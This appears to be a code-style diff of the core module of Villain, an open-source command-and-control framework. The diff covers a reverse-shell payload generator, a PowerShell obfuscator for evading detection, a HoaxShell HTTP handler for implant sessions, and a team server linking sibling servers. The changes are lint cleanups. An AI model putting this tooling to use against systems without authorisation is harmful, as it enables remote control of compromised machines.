@@ -1,4 +1,3 @@
-#!/usr/bin/env python3
 #
 # Author: Panagiotis Chartas (t3l3machus)
 #
@@ -6,13 +5,17 @@
 # https://github.com/t3l3machus/Villain
 
 
-import ssl, struct
-from http.server import HTTPServer, BaseHTTPRequestHandler
-from warnings import filterwarnings
+import ssl
+import struct
+import sys
 from ast import literal_eval
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from typing import ClassVar
+from warnings import filterwarnings
+
 from .common import *
-from .settings import *
 from .logging import *
+from .settings import *
 
 filterwarnings("ignore", category = DeprecationWarning)
 
@@ -56,12 +59,12 @@ class Payload_Generator:
 					tmp = arg.split("=")
 					args_dict[tmp[0].lower()] = tmp[1]
 
-				except:
+				except BaseException:  # noqa: BLE001
 					boolean_args.append(tmp[0].lower())
 
 			return [args_dict, boolean_args]
 
-		except:
+		except BaseException:  # noqa: BLE001
 			return None
 
 
@@ -86,13 +89,13 @@ class Payload_Generator:
 		get_cmd = uuid4().hex[0:6]
 		post_res = uuid4().hex[0:6]
 		header_id = 'Authorization' if not Hoaxshell_Settings._header else Hoaxshell_Settings._header
-		session_unique_id = '-'.join([verify, get_cmd, post_res])
-		exec_outfile = True if payload.meta['type'] in self.exec_outfile_support else False
+		session_unique_id = f'{verify}-{get_cmd}-{post_res}'
+		exec_outfile = payload.meta['type'] in self.exec_outfile_support
 
 		# Append data in Session manager
 		Sessions_Manager.legit_session_ids[session_unique_id] = {
 			'OS Type' : payload.meta['os'].capitalize(),
-			'constraint_mode' : True if payload.meta['type'] in self.constraint_mode_support else False,
+			'constraint_mode' : payload.meta['type'] in self.constraint_mode_support,
 			'frequency' : payload.config['frequency'],
 			'exec_outfile' : exec_outfile,
 			'payload_type' : payload.meta['type'],
@@ -142,7 +145,7 @@ class Payload_Generator:
 				payload.parameters["lhost"] = ni.ifaddresses(lhost_value)[ni.AF_INET][0]['addr']
 				return
 
-			except:
+			except BaseException:  # noqa: BLE001
 				# Check if valid hostname
 				if len(lhost_value) > 255:
 					payload.parameters["lhost"] = False
@@ -157,9 +160,8 @@ class Payload_Generator:
 						socket.gethostbyname(lhost_value)
 						payload.parameters["lhost"] = lhost_value
 						return
-					except:
+					except BaseException:  # noqa: BLE001
 						print('Failed to resolve LHOST.')
-						pass		   	 
 		   	 
 				payload.parameters["lhost"] = False
 				return
@@ -177,7 +179,7 @@ class Payload_Generator:
 			arguments = args_dict.keys()
 
 			if (not args_dict) or (not 'payload' in arguments):
-				print(f'Required argument PAYLOAD not supplied.')
+				print('Required argument PAYLOAD not supplied.')
 				return
 
 			else:
@@ -189,7 +191,7 @@ class Payload_Generator:
 			   	 
 					# Remove the module from sys.modules cache
 					try: sys.modules.pop(module_path, None)
-					except:	pass
+					except BaseException:	pass  # noqa: BLE001, S110
 
 					# Load payload template
 					template = import_module(module_path, package = None)
@@ -223,7 +225,7 @@ class Payload_Generator:
 					return
 
 			# Process payload template
-			print(f'Generating payload...')
+			print('Generating payload...')
 
 			if payload.meta['handler'] == 'hoaxshell':
 				self.compute_hoaxshell(payload, args_dict)
@@ -231,7 +233,7 @@ class Payload_Generator:
 			elif payload.meta['handler'] in ['netcat', 'reverse_tcp']:
 				self.compute_reverse_tcp_payload(payload, args_dict)
 
-		except:
+		except BaseException:  # noqa: BLE001
 
 			del payload, template
 			print('Error parsing arguments. Check your input and try again.')
@@ -253,7 +255,7 @@ class Payload_Generator:
 			copy2cb(payload.data)
 			print(f'{ORANGE}Copied to clipboard!{END}')
 
-		except:
+		except BaseException:  # noqa: BLE001
 			print(f'{RED}Copy to clipboard failed. You need to do it manually.{END}')
 
 		# Disengage payload template
@@ -270,7 +272,7 @@ class Payload_Generator:
 			info.append(f'{payload.info["Title"]}\n')
 
 			info.append('\nRequired Arguments\n------------------')
-			for key in payload.parameters.keys():
+			for key in payload.parameters:
 				info.append(f'\n{key.upper()}\n')
 
 			# if payload.config:
@@ -280,12 +282,12 @@ class Payload_Generator:
 
 			if payload.attrs:
 				info.append('\nSupported Utilities\n-------------------\n')
-				for key in payload.attrs.keys():
+				for key in payload.attrs:
 					info.append(f'{key.upper()}\n')
 	   	 
 			print(''.join(info) + '\n')
 
-		except Exception as e:
+		except Exception:  # noqa: BLE001
 			traceback.print_exc()
 
 			print('Payload template exists but seems to have improper format.')
@@ -529,12 +531,12 @@ class Obfuscator:
 			'Invoke-RestMethod' : 'irm'
 		}
 
-		for alt in alternatives.keys():
+		for alt, replacement in alternatives.items():
 
 			p = randint(0,1)
 
 			if p == 0:
-				payload = payload.replace(alt, alternatives[alt])
+				payload = payload.replace(alt, replacement)
 
 			else:
 				pass
@@ -547,14 +549,14 @@ class Obfuscator:
 		'Invoke-RestMethod', 'irm', 'Start-Process', 'Hidden', 'add-type']
 
 		# Randomize char case of specified components
-		for i in range(0, len(components)):
+		for i in range(len(components)):
 			rand_case = self.randomize_case(components[i])
 			payload = payload.replace(components[i], rand_case)
 			components[i] = rand_case
 
 
 		# Obfuscate specified components
-		for i in range(0, len(components)):
+		for i in range(len(components)):
 			if (components[i].count('.') == 0) and components[i].lower() not in ['while', 'username', 'computername']:
 				obf_cmdlet = self.obfuscate_cmdlet(components[i])
 				payload = payload.replace(components[i], obf_cmdlet)
@@ -567,16 +569,16 @@ class Obfuscator:
 
 class Sessions_Manager:
 
-	active_sessions = {}
-	legit_session_ids = {}
-	sessions_graveyard = []
-	aliases = []
-	shell_redirectors = {}
+	active_sessions: ClassVar[dict] = {}
+	legit_session_ids: ClassVar[dict] = {}
+	sessions_graveyard: ClassVar[list] = []
+	aliases: ClassVar[list] = []
+	shell_redirectors: ClassVar[dict] = {}
 
 	# Hoaxshell
-	verify = []
-	get_cmd = []
-	post_res = []
+	verify: ClassVar[list] = []
+	get_cmd: ClassVar[list] = []
+	post_res: ClassVar[list] = []
 
 	# Load past generated legit session payload details (if beacon is still alive they may be re-establish)
 	past_generated_sessions = HoaxShell_Implants_Logger.retrieve_past_sessions_data()
@@ -585,7 +587,7 @@ class Sessions_Manager:
 
 		sessions_data = literal_eval(past_generated_sessions)
 
-		for id in sessions_data.keys():
+		for id in sessions_data:
 	   	 
 			legit_session_ids[id] = sessions_data[id]
 			h = id.split('-')
@@ -610,7 +612,7 @@ class Sessions_Manager:
 				Core_Server.broadcast({session_id : {key : new_val}}, 'repair')
 				return 0
 
-			except:
+			except BaseException:  # noqa: BLE001
 				return ['Failed to repair value.']
 
 		else:
@@ -621,7 +623,7 @@ class Sessions_Manager:
 	def repair_val_check(self, value):
 
 		if value[0] == '-':
-			return [f'Value cannot begin with a hyphen.']
+			return ['Value cannot begin with a hyphen.']
 
 		length = len(value)
 
@@ -650,7 +652,7 @@ class Sessions_Manager:
 			print('\r')
 
 		else:
-			print(f'No active sessions.')
+			print('No active sessions.')
 
 
 
@@ -664,7 +666,7 @@ class Sessions_Manager:
 			print('\r')
 
 		else:
-			print(f'No active sessions.')
+			print('No active sessions.')
 
 
 
@@ -673,7 +675,7 @@ class Sessions_Manager:
 		sessions_list = []
 		active_sessions_clone = deepcopy(self.active_sessions)
 
-		for session_id in active_sessions_clone.keys():
+		for session_id in active_sessions_clone:
 
 			tmp = active_sessions_clone[session_id]
 			corrupted = 0
@@ -704,7 +706,7 @@ class Sessions_Manager:
 	@staticmethod
 	def return_session_attr_value(session_id, attr):
 
-		if session_id in Sessions_Manager.active_sessions.keys():
+		if session_id in Sessions_Manager.active_sessions:
 			return Sessions_Manager.active_sessions[session_id][attr]
 
 		else:
@@ -724,10 +726,9 @@ class Sessions_Manager:
 
 		else:
 			for session_id in active_sessions:
-				if active_sessions_clone[session_id]['aliased']:
-					if active_sessions_clone[session_id]['alias'] == alias:
-						sid = session_id
-						break
+				if active_sessions_clone[session_id]['aliased'] and active_sessions_clone[session_id]['alias'] == alias:
+					sid = session_id
+					break
 
 		del active_sessions_clone, active_sessions
 		return sid
@@ -751,7 +752,7 @@ class Sessions_Manager:
 
 	def kill_session(self, session_id):
 
-		if session_id in self.active_sessions.keys():
+		if session_id in self.active_sessions:
 			if self.active_sessions[session_id]['Owner'] == Core_Server.SERVER_UNIQUE_ID:
 				self.sessions_graveyard.append(session_id)
 
@@ -786,7 +787,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	server_name = 'HoaxShell Multi-Handler'
 	header_id = Hoaxshell_Settings._header
 	server_unique_id = None
-	command_pool = {}
+	command_pool: ClassVar[dict] = {}
 
 	# Shell
 	active_shell = None
@@ -804,7 +805,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 		try:
 			sibling_server_id = re.findall("{[a-zA-Z0-9]{32}}", output)[-1].strip("{}")
-		except:
+		except BaseException:  # noqa: BLE001
 			sibling_server_id = None
 
 		return sibling_server_id
@@ -822,7 +823,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				if re.search('cmd-curl', payload_type):
 					try:
 						output = output.split('\n', 1)[1]
-					except:
+					except BaseException:  # noqa: BLE001
 						output = None
 
 			else:
@@ -835,7 +836,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 					output = None
 
 			# Check if command was issued by a sibling server
-			if session_id in Sessions_Manager.shell_redirectors.keys():
+			if session_id in Sessions_Manager.shell_redirectors:
 				sibling_id  = Sessions_Manager.shell_redirectors[session_id]
 			else:
 				sibling_id = False
@@ -858,7 +859,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	def activate_pseudo_shell_session(session_id, os_type):
 
 		session_data = Sessions_Manager.active_sessions[session_id]
-		is_remote_shell = True if not session_data['self_owned'] else False
+		is_remote_shell = bool(not session_data['self_owned'])
 		# prompt = session_data['prompt']
 		shell_type = session_data['Shell']
 		listener = session_data['Listener']
@@ -869,7 +870,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 		# Print pseudo-shell info
 		activation_msg = 'Interactive pseudo-shell activated.\nPress Ctrl + C or type "exit" to deactivate.\n'
-		stable = True if Sessions_Manager.return_session_attr_value(session_id, 'Stability') == 'Stable' else False
+		stable = Sessions_Manager.return_session_attr_value(session_id, 'Stability') == 'Stable'
 
 		if not stable:
 			print(f'\n{BOLD}This session is unstable. Consider running a TCP reverse shell process in it{END}.')
@@ -879,11 +880,11 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		# Check if there are any redirectors. Normally, there shouldn't be any
 		# if the session is self-owned. This function (activate_pseudo_shell_session) running  
 		# means the session is not occupied by a sibling.
-		if session_id in Sessions_Manager.shell_redirectors.keys():
+		if session_id in Sessions_Manager.shell_redirectors:
 			print(f'{ATT} There\'s an active redirector set for this session.')
 
 		# Init command pool
-		if Hoaxshell.active_shell not in Hoaxshell.command_pool.keys():
+		if Hoaxshell.active_shell not in Hoaxshell.command_pool:
 			Hoaxshell.command_pool[Hoaxshell.active_shell] = []
 
 		if is_remote_shell:
@@ -893,7 +894,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 			# Set output redirector on the sibling server
 			req_data = {'session_id' : session_id}
-			response = Core_Server.send_receive_one_encrypted(session_owner_id, req_data, 'set_redirector', Core_Server_Settings.timeout_for_command_output)
+			_response = Core_Server.send_receive_one_encrypted(session_owner_id, req_data, 'set_redirector', Core_Server_Settings.timeout_for_command_output)
 
 			Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, '')
 
@@ -915,7 +916,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 					cmd_list[0] = cmd_list[0].lower()
 
 					if cmd_list[0] == 'clear':
-						os.system('clear')
+						print('\033[2J\033[H', end='', flush=True)
 						if listener == 'reverse tcp':
 							if is_remote_shell:
 								Core_Server.proxy_cmd_for_exec_by_sibling(session_owner_id, session_id, '')
@@ -935,7 +936,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 						except IndexError:
 							out_path = os.path.basename(cmd_list[1])
 
-						if session_id in Sessions_Manager.active_sessions.keys():
+						if session_id in Sessions_Manager.active_sessions:
 
 							# Check if file exists
 							if os.path.isfile(file_path):
@@ -971,7 +972,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 						if execution_object[0] in [os.sep, '~']:
 							file_path = os.path.expanduser(execution_object)
-							is_file = True if os.path.isfile(file_path) else False
+							is_file = bool(os.path.isfile(file_path))
 							
 							try:
 
@@ -980,14 +981,11 @@ class Hoaxshell(BaseHTTPRequestHandler):
 									execution_object = get_file_contents(file_path, 'r')
 									
 									if not execution_object: 
-										raise				
-									try:
-										if not execution_object.strip('\n\r\t '):
-											print(f'\r[{WARN}] File "{file_path}" is empty.')
-											continue
-									except:
-										raise
-							except:
+										raise ValueError('File is empty')
+									if not execution_object.strip('\n\r\t '):
+										print(f'\r[{WARN}] File "{file_path}" is empty.')
+										continue
+							except BaseException:  # noqa: BLE001
 								print(f'\r[{ERR}] Failed to read file {file_path}.')
 								continue						
 
@@ -1027,7 +1025,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 						try:
 							option = cmd_list[1]
-						except:
+						except BaseException:  # noqa: BLE001
 							option = ''
 
 						if option in ['on', 'off']:
@@ -1049,7 +1047,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 
 
-					elif user_input in Core_Server.requests.keys():
+					elif user_input in Core_Server.requests:
 						Core_Server.requests[user_input] = True
 
 
@@ -1058,7 +1056,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 							PrompHelp.print_main_help_msg()
 											
 						elif cmd_list_len == 2:
-							PrompHelp.print_detailed(cmd_list[1]) if cmd_list[1] in PrompHelp.commands.keys() \
+							PrompHelp.print_detailed(cmd_list[1]) if cmd_list[1] in PrompHelp.commands \
 							else print(f'Command {cmd_list[1] if len(cmd_list[1]) <= 10 else f"{cmd_list[1][0:4]}..{cmd_list[1][-4:]}" } does not exist.')
 
 						continue
@@ -1089,19 +1087,18 @@ class Hoaxshell(BaseHTTPRequestHandler):
 								else:
 									Hoaxshell.command_pool[Hoaxshell.active_shell].append(user_input)
 						else:
-							print(f'\rNo active session.')
+							print('\rNo active session.')
 				else:
 					sleep(0.1)
 					continue
-			else:
-				raise KeyboardInterrupt
+			raise KeyboardInterrupt
 
 
 		except KeyboardInterrupt:
 			# Remove any redirectors
 			if is_remote_shell:
 				req_data = {'session_id' : session_id}
-				response = Core_Server.send_receive_one_encrypted(session_owner_id, req_data, 'pop_redirector', Core_Server_Settings.timeout_for_command_output)
+				_response = Core_Server.send_receive_one_encrypted(session_owner_id, req_data, 'pop_redirector', Core_Server_Settings.timeout_for_command_output)
 
 			Hoaxshell.command_pool[Hoaxshell.active_shell] = []
 			print('\r')
@@ -1137,19 +1134,19 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 		# Identify session
 		if not Hoaxshell.header_id:
-			header_id_extract = [header.replace("X-", "") for header in self.headers.keys() if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
+			header_id_extract = [header.replace("X-", "") for header in self.headers if re.match("X-[a-z0-9]{4}-[a-z0-9]{4}", header)]
 			Hoaxshell.header_id = f'X-{header_id_extract[0]}'
 
 		try:
 			session_id = self.headers.get(Hoaxshell.header_id)
 
-		except:
+		except BaseException:  # noqa: BLE001
 			session_id = None
 
 
-		if session_id and (session_id not in Sessions_Manager.active_sessions.keys()):
+		if session_id and (session_id not in Sessions_Manager.active_sessions):
 
-			if session_id in Sessions_Manager.legit_session_ids.keys():
+			if session_id in Sessions_Manager.legit_session_ids:
 				h = session_id.split('-')
 				Sessions_Manager.verify.append(h[0])
 				Sessions_Manager.get_cmd.append(h[1])
@@ -1176,7 +1173,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 				Hoaxshell.command_pool[session_id] = []
 
-		elif session_id and (session_id in Sessions_Manager.active_sessions.keys()):
+		elif session_id and (session_id in Sessions_Manager.active_sessions):
 			Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp
 
 
@@ -1186,7 +1183,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		self.server_version = Hoaxshell_Settings.server_version
 		self.sys_version = ""
 		session_id = self.headers.get(Hoaxshell.header_id)
-		legit = True if session_id in Sessions_Manager.legit_session_ids.keys() else False
+		legit = session_id in Sessions_Manager.legit_session_ids
 
 
 		# Verify execution
@@ -1218,7 +1215,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 		   	 
 			try:
 				Thread(target = self.monitor_shell_state, args = (session_id,), name = f'session_state_monitor_{self.client_address[0]}', daemon = True).start()
-			except:
+			except BaseException:  # noqa: BLE001, S110
 				pass
 
 			new_session_data = deepcopy(Sessions_Manager.active_sessions[session_id])
@@ -1267,7 +1264,6 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			self.end_headers()
 			self.wfile.write(b'')
 			# self.wfile.write(b'exit 1') # kills crippled hoaxshell sessions that continue to spam requests
-			pass
 
 
 
@@ -1275,7 +1271,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 		timestamp = int(datetime.now().timestamp())
 		session_id = self.headers.get(self.header_id)
-		legit = True if (session_id in Sessions_Manager.legit_session_ids.keys()) else False
+		legit = (session_id in Sessions_Manager.legit_session_ids)
 
 		if legit:
 
@@ -1286,7 +1282,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 				# cmd output
 				if self.path.strip("/") in Sessions_Manager.post_res and legit and\
-				session_id in Sessions_Manager.active_sessions.keys():
+				session_id in Sessions_Manager.active_sessions:
 
 					try:
 						self.send_response(200)
@@ -1311,12 +1307,11 @@ class Hoaxshell(BaseHTTPRequestHandler):
 								Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
 
 							# list == Sibling issued cmd
-							elif isinstance(output, list):
-								if not isinstance(output[1], int):
-									try:
-										Core_Server.send_receive_one_encrypted(output[0], [f'{GREEN}{output[1]}{END}', '', session_id, True], 'command_output', 30)
-									except:
-										pass
+							elif isinstance(output, list) and not isinstance(output[1], int):
+								try:
+									Core_Server.send_receive_one_encrypted(output[0], [f'{GREEN}{output[1]}{END}', '', session_id, True], 'command_output', 30)
+								except BaseException:  # noqa: BLE001, S110
+									pass
 
 
 					except ConnectionResetError:
@@ -1329,7 +1324,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 						elif isinstance(output, list):
 							try: Core_Server.send_receive_one_encrypted(output[0], [error_msg, '', session_id, True], 'command_output', 30)
-							except: pass
+							except BaseException: pass  # noqa: BLE001, S110
 
 						del error_msg
 				   	 
@@ -1344,7 +1339,6 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			self.send_response(200)
 			self.end_headers()
 			self.wfile.write(b'Move on mate.')
-			pass
 
 
 
@@ -1407,7 +1401,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 						Hoaxshell.dropSession(session_id)
 						#Core_Server.announce_session_termination({'session_id' : session_id})
 
-				except:
+				except BaseException:  # noqa: BLE001, S112
 					continue
 
 			sleep(2)
@@ -1424,10 +1418,10 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 		while True:
 
-			if session_id in Sessions_Manager.active_sessions.keys():
+			if session_id in Sessions_Manager.active_sessions:
 
 				if session_id in Sessions_Manager.sessions_graveyard and \
-				session_id not in Sessions_Manager.active_sessions.keys():
+				session_id not in Sessions_Manager.active_sessions:
 					break
 
 				timestamp = int(datetime.now().timestamp())
@@ -1464,7 +1458,7 @@ def initiate_hoax_server():
 		# Check if both cert and key files were provided
 		if (Hoaxshell_Settings.certfile and not Hoaxshell_Settings.keyfile) or \
 			(Hoaxshell_Settings.keyfile and not Hoaxshell_Settings.certfile):
-			exit(f'[{DEBUG}] SSL support seems to be misconfigured (missing key or cert file).')
+			sys.exit(f'[{DEBUG}] SSL support seems to be misconfigured (missing key or cert file).')
 
 		# Start http server
 		port = Hoaxshell_Settings.bind_port if not Hoaxshell_Settings.ssl_support else Hoaxshell_Settings.bind_port_ssl
@@ -1473,10 +1467,10 @@ def initiate_hoax_server():
 			httpd = HTTPServer((Hoaxshell_Settings.bind_address, port), Hoaxshell)
 
 		except OSError:
-			exit(f'[{DEBUG}] {Hoaxshell.server_name} failed to start. Port {port} seems to already be in use.\n')
+			sys.exit(f'[{DEBUG}] {Hoaxshell.server_name} failed to start. Port {port} seems to already be in use.\n')
 
-		except:
-			exit(f'\n[{DEBUG}] {Hoaxshell.server_name} failed to start (Unknown error occurred).\n')
+		except BaseException:  # noqa: BLE001
+			sys.exit(f'\n[{DEBUG}] {Hoaxshell.server_name} failed to start (Unknown error occurred).\n')
 
 		if Hoaxshell_Settings.ssl_support:
 			context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
@@ -1501,9 +1495,9 @@ def initiate_hoax_server():
 class Core_Server:
 
 	server_name = 'Team Server'
-	acknowledged_servers = []
-	sibling_servers = {}
-	requests = {}
+	acknowledged_servers: ClassVar[list] = []
+	sibling_servers: ClassVar[dict] = {}
+	requests: ClassVar[dict] = {}
 	SERVER_UNIQUE_ID = str(uuid4()).replace('-', '')
 	HOSTNAME = socket.gethostname()
 	listen = True
@@ -1544,7 +1538,7 @@ class Core_Server:
 						conn.close()
 						return
 
-					request_id = ''.join(["{}".format(randint(0, 9)) for num in range(0, 4)])
+					request_id = ''.join([f"{randint(0, 9)}" for num in range(4)])
 					self.requests[request_id] = False
 
 					if Core_Server_Settings.insecure:
@@ -1588,14 +1582,14 @@ class Core_Server:
 					sibling_server_port = tmp[1]
 					sibling_server_hostname = tmp[2]
 
-				except:
+				except BaseException:  # noqa: BLE001
 					sibling_id = None
 
 
 				if is_valid_uuid(sibling_id):
 
 					self.sibling_servers[sibling_id] = {'Hostname' : sibling_server_hostname, 'Server IP' : address[0], 'Server Port' : int(sibling_server_port), 'Status' : 'Active'}
-					Core_Server.send_msg(conn, f'{self.SERVER_UNIQUE_ID}:{self.HOSTNAME}'.encode("utf-8"))
+					Core_Server.send_msg(conn, f'{self.SERVER_UNIQUE_ID}:{self.HOSTNAME}'.encode())
 					self.acknowledged_servers.remove(address[0])
 
 					# Synchronize all servers
@@ -1643,7 +1637,7 @@ class Core_Server:
 						data = decrypted_data[1]
 
 						# Check if session exists
-						if data['session_id'] in Sessions_Manager.active_sessions.keys():
+						if data['session_id'] in Sessions_Manager.active_sessions:
 							Hoaxshell.command_pool[data['session_id']].append(data['command'])
 							Core_Server.send_msg(conn, self.response_ack(sibling_id))
 
@@ -1675,9 +1669,9 @@ class Core_Server:
 						# prompt_ready = True #decrypted_data[1][3]
 
 						try:
-							os_type = Sessions_Manager.active_sessions[session_id]['OS Type']
-						except:
-							os_type = False
+							_os_type = Sessions_Manager.active_sessions[session_id]['OS Type']
+						except BaseException:  # noqa: BLE001
+							_os_type = False
 
 						if decrypted_data[1][0] == 'Awaiting for response reached the defined timeout.':
 							print(f'\r{ORANGE}{decrypted_data[1][0]}{END}')
@@ -1712,10 +1706,10 @@ class Core_Server:
 
 					elif decrypted_data[0] == 'repair':
 
-						session_id = list(decrypted_data[1].keys())[0]
+						session_id = next(iter(decrypted_data[1]))
 
-						if session_id in Sessions_Manager.active_sessions.keys():
-							key = list(decrypted_data[1][session_id].keys())[0]
+						if session_id in Sessions_Manager.active_sessions:
+							key = next(iter(decrypted_data[1][session_id]))
 							new_val = decrypted_data[1][session_id][key]
 							Sessions_Manager.active_sessions[session_id][key] = new_val
 
@@ -1811,7 +1805,7 @@ class Core_Server:
 										del Sessions_Manager.active_sessions[session_id]
 										lost_session_ids.append(session_id)
 
-								except:
+								except BaseException:  # noqa: BLE001, S112
 									continue
 
 						lost_sessions = len(lost_session_ids)
@@ -1844,7 +1838,7 @@ class Core_Server:
 			pass
 
 
-		except:
+		except BaseException:  # noqa: BLE001
 			print(f'\r[{WARN}] failed to process a request.					 	')
 			rst_prompt = True
 
@@ -1919,7 +1913,7 @@ class Core_Server:
 			self.core_initialized = False
 			exit_with_msg(f'{self.server_name} failed to start. Port {Core_Server_Settings.bind_port} seems to be already in use.\n')
 
-		except:
+		except BaseException:  # noqa: BLE001
 			self.core_initialized = False
 			exit_with_msg(f'{self.server_name} failed to start (Unknown error occurred).\n')
 
@@ -1973,7 +1967,7 @@ class Core_Server:
 			print('\r')
 
 		else:
-			print(f'Not connected with other servers.')
+			print('Not connected with other servers.')
 
 
 
@@ -2002,7 +1996,7 @@ class Core_Server:
 		except socket.timeout:
 			return 'timed_out'
 
-		except:
+		except BaseException:  # noqa: BLE001
 			return 'unknown_error'
 
 
@@ -2021,11 +2015,11 @@ class Core_Server:
 
 		try:
 			dict_data = literal_eval(data)
-			capsule = list(dict_data.keys())[0]
+			capsule = next(iter(dict_data))
 			received_data = dict_data[capsule]
 			return [capsule, received_data]
 
-		except:
+		except BaseException:  # noqa: BLE001
 			return 'failed_to_read'
 
 
@@ -2087,7 +2081,7 @@ class Core_Server:
 		current_siblings = self.sibling_servers.keys()
 		additional_siblings = 0
 
-		for sibling_id in siblings_data.keys():
+		for sibling_id in siblings_data:
 			if (sibling_id not in current_siblings) and (sibling_id != self.SERVER_UNIQUE_ID):
 				self.sibling_servers[sibling_id] = siblings_data[sibling_id]
 				additional_siblings += 1
@@ -2103,7 +2097,7 @@ class Core_Server:
 		additional_shells = 0
 
 		if isinstance(shells_data, dict):
-			for session_id in shells_data.keys():
+			for session_id in shells_data:
 				if (session_id not in current_shells) and shells_data[session_id]['Owner'] != Hoaxshell.server_unique_id:
 					shells_data[session_id]['alias'] = None
 					shells_data[session_id]['aliased'] = False
@@ -2180,9 +2174,8 @@ class Core_Server:
 
 		for sibling_id in sibling_servers:
 			active_shell = Core_Server.send_receive_one_encrypted(sibling_id, self.sibling_servers, 'active_shell_query')
-			if active_shell:
-				if active_shell[1] == session_id:
-					return True
+			if active_shell and active_shell[1] == session_id:
+				return True
 
 		return False
 
@@ -2193,11 +2186,11 @@ class Core_Server:
 
 		try:
 			session_owner_id = Sessions_Manager.return_session_attr_value(session_id, 'Owner')
-			prompt_value = Core_Server.send_receive_one_encrypted(session_owner_id, session_id, 'prompt_value_query')
+			_prompt_value = Core_Server.send_receive_one_encrypted(session_owner_id, session_id, 'prompt_value_query')
 			# return prompt_value
 			return ''
 
-		except:
+		except BaseException:  # noqa: BLE001
 			return None
 
 
@@ -2210,9 +2203,8 @@ class Core_Server:
 		for sibling_id in sibling_servers:
 
 			remote_siblings_data = Core_Server.send_receive_one_encrypted(sibling_id, self.sibling_servers, 'synchronize_sibling_servers_table')
-			if remote_siblings_data:
-				if isinstance(remote_siblings_data[1], dict):
-					self.update_siblings_data_table(remote_siblings_data[1])
+			if remote_siblings_data and isinstance(remote_siblings_data[1], dict):
+				self.update_siblings_data_table(remote_siblings_data[1])
 
 			# Sync sibling servers shell sessions
 			remote_shells = Core_Server.send_receive_one_encrypted(sibling_id, Sessions_Manager.active_sessions, 'synchronize_sibling_servers_shells')
@@ -2300,7 +2292,7 @@ class Core_Server:
 	def proxy_cmd_for_exec_by_sibling(sibling_id, session_id, command):
 
 		# Check again if server in siblings
-		if sibling_id not in Core_Server.sibling_servers.keys():
+		if sibling_id not in Core_Server.sibling_servers:
 			print(f'\r[{ERR}] Failed to proxy the command. Connection with the sibling server may be lost.')
 			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
 			return
@@ -2311,7 +2303,7 @@ class Core_Server:
 
 		# Send command to sibling
 		cmd_exec_data = {'session_id' : session_id, 'command' : command}
-		response = Core_Server.send_receive_one_encrypted(sibling_id, cmd_exec_data, 'exec_command', Core_Server_Settings.timeout_for_command_output)
+		_response = Core_Server.send_receive_one_encrypted(sibling_id, cmd_exec_data, 'exec_command', Core_Server_Settings.timeout_for_command_output)
 
 		# Read response
 		# if response[0] == 'ACKNOWLEDGED':
@@ -2340,16 +2332,15 @@ class Core_Server:
 
 						if response in ['connection_refused', 'timed_out', 'connection_reset', 'no_route_to_host', 'unknown_error']:
 							# Check if active shell against a session that belongs to the lost sibling
-							if Hoaxshell.active_shell in Sessions_Manager.active_sessions.keys():
-								if Sessions_Manager.active_sessions[Hoaxshell.active_shell]['Owner'] == sibling_id:
-									Hoaxshell.deactivate_shell()
+							if Hoaxshell.active_shell in Sessions_Manager.active_sessions and Sessions_Manager.active_sessions[Hoaxshell.active_shell]['Owner'] == sibling_id:
+								Hoaxshell.deactivate_shell()
 
 							self.remove_all_sessions(sibling_id)
 							server_ip = self.sibling_servers[sibling_id]["Server IP"]
 							del self.sibling_servers[sibling_id]
 							print_to_prompt(f'\r[{WARN}] Connection with sibling server {ORANGE}{server_ip}{END} lost.')
 
-					except:
+					except BaseException:  # noqa: BLE001, S112
 						continue
 
 			sleep(Core_Server_Settings.ping_siblings_sleep_time)
@@ -2372,7 +2363,7 @@ class Core_Server:
 		corrupted = 0
 		siblings_clone = deepcopy(self.sibling_servers)
 
-		for sibling_id in siblings_clone.keys():
+		for sibling_id in siblings_clone:
 
 			try:
 				tmp = siblings_clone[sibling_id]
@@ -2408,7 +2399,7 @@ class TCP_Sock_Multi_Handler:
 			self.listener_initialized = False
 			exit_with_msg(f'{self.server_name} failed to start. Port {TCP_Sock_Handler_Settings.bind_port} seems to be already in use.\n')
 
-		except:
+		except BaseException:  # noqa: BLE001
 			self.listener_initialized = False
 			exit_with_msg(f'{self.server_name} failed to start (Unknown error occurred).\n')
 
@@ -2425,7 +2416,7 @@ class TCP_Sock_Multi_Handler:
 		while self.listen:
 			conn, address = tcp_server.accept()
 			iface = conn.getsockname()[0]
-			sock_t = Thread(target = self.shell_reverse_tcp_handler, args = (conn, address, iface), name = f'tcp_reverse_shell_{address[0]}').start()
+			_sock_t = Thread(target = self.shell_reverse_tcp_handler, args = (conn, address, iface), name = f'tcp_reverse_shell_{address[0]}').start()
 			sleep(0.1)
 
 
@@ -2434,7 +2425,7 @@ class TCP_Sock_Multi_Handler:
 	def remove_redirector(session_id):
 		try:
